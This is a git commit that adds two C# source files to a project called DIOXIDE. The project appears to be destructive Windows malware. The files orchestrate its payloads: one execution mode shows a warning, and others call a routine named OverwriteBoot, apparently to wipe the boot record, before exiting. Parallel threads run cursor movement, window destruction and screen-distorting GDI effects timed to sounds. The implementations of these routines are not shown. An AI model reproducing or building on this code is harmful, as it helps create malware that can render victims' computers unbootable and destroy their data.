ddf6fa0a0fc71bb33d7576c1361672f600c255ab
Mist <59188378+Mist0090@users.noreply.github.com>
2021-12-18 20:08:10 +0900

    Add files via upload

---
+++ main-Dioxide/execute.cs
@@ -0,0 +1,76 @@
+﻿using System.Threading;
+using System.Windows.Forms;
+
+namespace DIOXIDE
+{
+    class execute
+    {
+        public static void executeEWP()
+        {
+            destruction destruction = new destruction();
+            payloads payloads = new payloads();
+
+            Application.EnableVisualStyles();
+            Win32API.SetProcessDPIAware();
+
+            destruction.WARNING();
+
+            payloads.CreateWaveFile();
+
+            Thread.Sleep(5000);
+
+            run_payloads.Start();
+        }
+        public static void executeNWD()
+        {
+            destruction destruction = new destruction();
+            payloads payloads = new payloads();
+
+            Application.EnableVisualStyles();
+            Win32API.SetProcessDPIAware();
+
+            payloads.CreateWaveFile();
+
+            destruction.OverwriteBoot();
+
+            Thread.Sleep(5000);
+
+            run_payloads.Start();
+
+            destruction.Exit();
+        }
+        public static void executeP()
+        {
+            payloads payloads = new payloads();
+
+            Application.EnableVisualStyles();
+            Win32API.SetProcessDPIAware();
+
+            payloads.CreateWaveFile();
+
+            Thread.Sleep(5000);
+
+            run_payloads.Start();
+        }
+        public static void executeD()
+        {
+            destruction destruction = new destruction();
+            payloads payloads = new payloads();
+
+            Application.EnableVisualStyles();
+            Win32API.SetProcessDPIAware();
+
+            destruction.WARNING();
+
+            payloads.CreateWaveFile();
+
+            destruction.OverwriteBoot();
+
+            Thread.Sleep(5000);
+
+            run_payloads.Start();
+
+            destruction.Exit();
+        }
+    }
+}
---
+++ main-Dioxide/run_payloads.cs
@@ -0,0 +1,51 @@
+﻿using System;
+using System.Threading;
+
+namespace DIOXIDE
+{
+    class run_payloads
+    {
+        public static void Start()
+        {
+            Win32API.SetProcessDPIAware();
+
+            int True = 1;
+
+            payloads payloads = new payloads();
+            destruction destruction = new destruction();
+
+            new Thread(new ThreadStart(payloads.cursor_movement)).Start();
+            new Thread(new ThreadStart(destruction.destructwindows)).Start();
+
+            new Thread(new ThreadStart(payloads.gdi1)).Start();
+            payloads.Sound1();
+            payloads.gdi1_cancel = True;
+
+            new Thread(new ThreadStart(payloads.gdi2)).Start();
+            payloads.Sound2();
+            payloads.gdi2_cancel = True;
+
+            new Thread(new ThreadStart(payloads.gdi3)).Start();
+            payloads.Sound3();
+            payloads.gdi3_cancel = True;
+
+            Win32API.ReleaseDC(payloads.hwnd, payloads.hdc);
+            new Thread(new ThreadStart(payloads.gdi2)).Start();
+            new Thread(new ThreadStart(payloads.gdi3)).Start();
+            payloads.Sound4();
+            payloads.gdi2_cancel = True;
+            payloads.gdi3_cancel = True;
+
+            new Thread(new ThreadStart(payloads.gdi4)).Start();
+            payloads.Sound5();
+            payloads.gdi4_cancel = True;
+
+            new Thread(new ThreadStart(payloads.gdi5)).Start();
+            payloads.Sound6();
+            payloads.gdi5_cancel = True;
+            payloads.cursor_movement_cancel = True;
+
+            return;
+        }
+    }
+}
